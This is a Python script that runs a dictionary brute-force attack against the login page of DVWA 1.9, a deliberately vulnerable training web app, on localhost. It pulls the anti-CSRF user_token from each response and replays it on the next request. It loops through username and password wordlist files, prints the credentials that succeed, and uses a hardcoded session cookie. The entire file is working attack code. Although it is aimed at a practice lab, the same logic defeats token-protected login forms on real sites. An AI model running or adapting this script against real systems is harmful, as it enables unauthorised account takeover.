#encoding: utf-8

import os

import requests
from pyquery import PyQuery


BASE_DIR = os.path.dirname(os.path.abspath(__file__))


def read_file(path):
    with open(path, 'r') as fhandler:
        yield from fhandler

def brute_force(addr, user_token=None, username=None, password=None,
        headers=None, init=False):

    url = 'http://{0}:{1}/DVWA-1.9/vulnerabilities/brute/'.format(*addr)

    params = {}
    if not init:
        params = {
            'user_token' : user_token,
            'username' : username,
            'password' : password,
            'Login' : 'Login'
        }
    response = requests.get(url, params, headers=headers)
    if response.ok:
        if response.text.find('Welcome to the password protected area') != -1:
            print('+', username, password)

        pq = PyQuery(response.text)
        return pq('input[name=user_token]').val()

    return ''


def main(addr, headers):
    user_token = brute_force(addr, headers=headers, init=True)
    for username in read_file(os.path.join(BASE_DIR, 'user.txt')):
        for password in read_file(os.path.join(BASE_DIR, 'password.txt')):
            user_token = brute_force(addr, user_token, username.strip(),
                                        password.strip(), headers)


if __name__ == '__main__':
    server = ('localhost', 80, )
    headers = {
        'Cookie' : 'security=high; PHPSESSID=kcguk4lfhk88iugf0rtggr1s83',
    }
    main(server, headers)